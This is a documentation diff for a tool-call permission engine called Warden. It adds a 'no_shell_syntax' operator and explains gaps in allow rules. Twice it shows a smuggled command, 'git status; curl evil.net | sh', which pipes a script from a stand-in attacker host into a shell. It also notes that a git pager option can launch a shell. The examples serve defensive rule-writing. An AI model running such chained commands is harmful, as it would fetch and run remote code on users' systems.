@@ -77,6 +77,7 @@ The `gte 0` matters: without it, `-500` is "at most 500" and would be allowed
 | `exists`, `missing` | argument is present / absent | *(no value)* |
 | `host_in` | a URL's real host is one of these (any port or case; `".x.com"` = x.com and its subdomains). Only `http`/`https` URLs unless the condition has `schemes` | list of lowercase host names |
 | `contains` | the text contains this text (or any of a list). **Not allowed in `allow` rules** | non-empty text, or list of 1–100 texts |
+| `no_shell_syntax` | the text uses only letters, digits, spaces and `- _ . / : = , @ + %` (no `;`, `\|`, `&`, `$`, quotes, `>`, newlines, ...): see below | *(no value)* |
 
 - **Warden never gives a looser answer because an argument is missing.** On a `deny` or
   `require_approval` rule a missing argument counts as matching (the rule applies); on an
@@ -119,6 +120,14 @@ The `gte 0` matters: without it, `-500` is "at most 500" and would be allowed
   `"rm -rf"`. That's why it's refused in `allow` rules (`allow when command contains
   "git status"` would also allow `git status; curl evil.net | sh`); allow-list exact
   commands with `eq` / `in` instead. Hidden or look-alike characters deny the request.
+- **`no_shell_syntax`** closes the shell-syntax gap of `startswith` for commands a shell runs:
+  `allow when command startswith "git "` alone also allows `git status; curl evil.net | sh`.
+  Add `{ "arg": "command", "op": "no_shell_syntax" }` and only plain words pass (no
+  `;`, `|`, `&`, `$`, backticks, quotes, `<`, `>`, `*`, `~`, `#`, newlines, non-ASCII, or
+  a word starting with `=`). It doesn't judge the program's own options
+  (`git -c core.pager=sh log` is plain words): allow exact commands with `eq` / `in`
+  where that matters. Quoted arguments fail; send them to a human with `otherwise`.
+  [Design](design/no-shell-syntax.md).
 - Text a rule compares may not contain invisible characters or look-alike Unicode
   (full-width letters, look-alike dots), and paths may not contain `%`-escapes; such
   requests are denied.
